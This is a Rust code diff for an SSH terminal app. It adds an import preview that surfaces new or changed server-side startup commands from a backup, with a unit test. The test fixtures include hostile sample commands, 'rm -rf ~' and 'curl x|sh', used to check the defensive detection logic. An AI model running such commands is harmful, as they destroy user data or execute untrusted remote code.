@@ -62,9 +62,34 @@ pub struct ImportPreview {
     /// Connections not in this Termdock yet, and a few of their names.
     new_profiles: usize,
     new_names: Vec<String>,
+    /// Startup commands that are new or differ from the saved ones (they run
+    /// on the server when the connection opens), a few of them in full.
+    startup_count: usize,
+    startups: Vec<StartupCommand>,
     favorites: usize,
     /// The interface's settings; the UI validates them before using them.
     ui: serde_json::Value,
+}
+
+#[derive(Serialize)]
+pub struct StartupCommand {
+    name: String,
+    command: String,
+}
+
+/// The backup's startup commands that this Termdock does not already have
+/// for the same connection.
+fn changed_startups<'a>(backup: &'a [Profile], saved: &[Profile]) -> Vec<&'a Profile> {
+    backup
+        .iter()
+        .filter(|p| {
+            p.startup.is_some()
+                && saved
+                    .iter()
+                    .find(|s| s.id == p.id)
+                    .is_none_or(|s| s.startup != p.startup)
+        })
+        .collect()
 }
 
 fn now() -> u64 {
@@ -155,8 +180,13 @@ pub async fn config_import_pick(
     backup.profiles = profiles;
     backup.favorites = favorites;
 
-    let known: Vec<Uuid> = state.store.lock().unwrap().profiles().iter().map(|p| p.id).collect();
-    let new: Vec<&Profile> = backup.profiles.iter().filter(|p| !known.contains(&p.id)).collect();
+    let saved: Vec<Profile> = state.store.lock().unwrap().profiles().to_vec();
+    let new: Vec<&Profile> = backup
+        .profiles
+        .iter()
+        .filter(|p| !saved.iter().any(|s| s.id == p.id))
+        .collect();
+    let startups = changed_startups(&backup.profiles, &saved);
     let token = Uuid::new_v4();
     let preview = ImportPreview {
         token,
@@ -165,6 +195,15 @@ pub async fn config_import_pick(
         profiles: backup.profiles.len(),
         new_profiles: new.len(),
         new_names: new.iter().take(MAX_NAMES).map(|p| p.name.clone()).collect(),
+        startup_count: startups.len(),
+        startups: startups
+            .iter()
+            .take(MAX_NAMES)
+            .map(|p| StartupCommand {
+                name: p.name.clone(),
+                command: p.startup.clone().unwrap_or_default(),
+            })
+            .collect(),
         favorites: backup.favorites.len(),
         ui: backup.ui.clone(),
     };
@@ -235,4 +274,40 @@ pub fn config_import_apply(
 #[tauri::command]
 pub fn config_import_cancel(pending: State<'_, PendingImport>) {
     pending.0.lock().unwrap().take();
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn profile(id: u128, startup: Option<&str>) -> Profile {
+        serde_json::from_value(serde_json::json!({
+            "id": Uuid::from_u128(id),
+            "name": format!("p{id}"),
+            "type": "ssh",
+            "host": "example.com",
+            "port": 22,
+            "username": "u",
+            "auth": { "method": "auto" },
+            "startup": startup,
+        }))
+        .unwrap()
+    }
+
+    #[test]
+    fn only_new_or_changed_startup_commands_are_listed() {
+        let saved = [profile(1, Some("ls")), profile(2, Some("ls")), profile(3, None)];
+        let backup = [
+            profile(1, Some("ls")),        // unchanged
+            profile(2, Some("rm -rf ~")),  // changed
+            profile(3, Some("curl x|sh")), // added to an existing one
+            profile(4, Some("uptime")),    // new connection
+            profile(5, None),              // none
+        ];
+        let ids: Vec<u128> = changed_startups(&backup, &saved)
+            .iter()
+            .map(|p| p.id.as_u128())
+            .collect();
+        assert_eq!(ids, [2, 3, 4]);
+    }
 }
